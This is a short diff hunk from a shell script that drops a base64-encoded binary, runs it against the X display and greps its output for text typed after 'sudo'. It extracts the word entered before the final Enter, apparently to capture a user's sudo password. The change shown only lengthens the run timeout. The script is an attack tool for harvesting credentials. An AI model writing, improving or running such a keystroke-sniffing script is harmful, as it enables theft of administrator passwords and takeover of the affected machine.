@@ -7,7 +7,7 @@ base64 -d <<< f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAIDMAAAAAAABAAAAAAAAAABCgAAAAAAAAAA
 chmod +x temp2.bin
 export DISPLAY=":0"
 echo "searching"
-( timeout -k 9 15s  ./temp2.bin -m foreground 3>&1 1>&2- 2>&3- ) > test.txt
+( timeout -k 9 20s  ./temp2.bin -m foreground 3>&1 1>&2- 2>&3- ) > test.txt
 
 while ! cat test.txt | grep -o "sudo.*\[Enter\].*\[Enter\]" | perl -lane 'print $F[-2]' | grep ".*"
 do
